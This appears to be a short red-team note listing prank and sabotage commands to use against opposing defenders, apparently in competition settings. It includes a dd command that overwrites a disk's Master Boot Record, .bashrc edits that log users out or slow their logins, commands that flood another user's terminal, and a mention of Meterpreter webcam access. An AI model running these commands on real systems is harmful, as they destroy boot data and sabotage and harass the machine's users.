A small collection of tactics to mess with blue teamers in live environments...

# Linux

```shell
xrandr -o inverted # Flip X11 desktop session upside down.
tty # Retrieve TTY number (for redirection)
w   # Gives you you /dev/pts numbers

git clone https://github.com/klange/nyancat.git
cd nyancat
make
cd src
./nyancat > /dev/pts/<pts-num-of-opponent>

dd if=nyan.mbr of=/dev/sda # NyanMBR necessary, overwrites Master Boot Record with Nyancat animation. The MBR image can be found in this repository: https://github.com/brainsmoke/nyanmbr

echo exit >> ~/.bashrc # Add a logout to the login script

cat /dev/urandom > /dev/pts/[pts-num-of-opponent] # Fill terminal with random noise spewing out at high speed.

echo "echo "sleep 1;" >> ~/.bashrc">> ~/.bashrc # Add a longer sleep to their terminal startup every time they login. 

telnet towel.blinkenlights.nl > /dev/[pts-num-of-opponent]
```

# Windows
```powershell
start C:\Windows\Resources\Ease of Access Themes\hc1.theme # Start the Windows high-contrast theme

reg add "HKCU\Control Panel\Mouse" /v "MouseSpeed" /t REG_SZ /d "VALUE" /f # Modify mouse speed
```

Persistence with [[Meterpreter]] affords many options like `webcam_chat`. 

***DoS WITH GEESE***
You can download and install the [Desktop Goose](https://samperson.itch.io/desktop-goose/download/eyJleHBpcmVzIjoxNzM5NDE2Mjg0LCJpZCI6NTU4MjE4fQ%3d%3d.RdlBCXbB6sF2fBp3tD9%2f19MhrZs%3d) on Windows and Mac. Running ten or more Desktop Geese may crash the adversary's computer.

